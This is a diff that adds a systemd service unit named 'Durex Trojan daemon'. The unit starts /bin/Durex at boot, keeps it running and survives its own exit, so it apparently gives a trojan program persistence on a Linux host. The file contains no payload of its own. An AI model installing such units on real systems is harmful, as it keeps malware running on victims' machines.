@@ -1,0 +1,12 @@
+[Unit]
+Description=Durex Trojan daemon
+After=network.target
+
+[Service]
+Type=simple
+RemainAfterExit=yes
+KillMode=process
+ExecStart=/bin/Durex
+
+[Install]
+WantedBy=multi-user.target
